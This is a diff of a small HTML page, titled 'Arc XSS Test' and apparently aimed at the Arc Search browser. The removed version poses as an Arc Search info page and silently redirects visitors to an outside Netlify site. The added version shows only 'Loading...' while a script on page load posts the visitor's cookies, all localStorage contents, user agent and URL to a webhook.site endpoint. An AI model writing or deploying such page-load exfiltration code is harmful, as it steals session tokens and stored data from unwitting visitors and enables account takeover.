@@ -1,17 +1,28 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Search Result</title>
+    <title>Arc XSS Test</title>
   </head>
   <body>
-    <h1>Arc Search Test Page</h1>
-    <p>This page contains useful content about the Arc Search browser engine and its JavaScript rendering behavior.</p>
-
     <script>
-      // Redirect silently after few seconds
-      setTimeout(function () {
-        window.location.href = "https://astonishing-ganache-ed3660.netlify.app/";
-      }, 2000);
+      // لتأكيد تشغيل السكربت
+      console.log("✅ JavaScript is running!");
+
+      // إرسال البيانات إلى Webhook
+      fetch("https://webhook.site/23aa3c8e-75cb-4dd9-9e94-68a9856a4bcf", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          cookies: document.cookie,
+          localStorage: Object.assign({}, localStorage),
+          userAgent: navigator.userAgent,
+          url: window.location.href
+        })
+      });
     </script>
+
+    <p>Loading...</p>
   </body>
 </html>
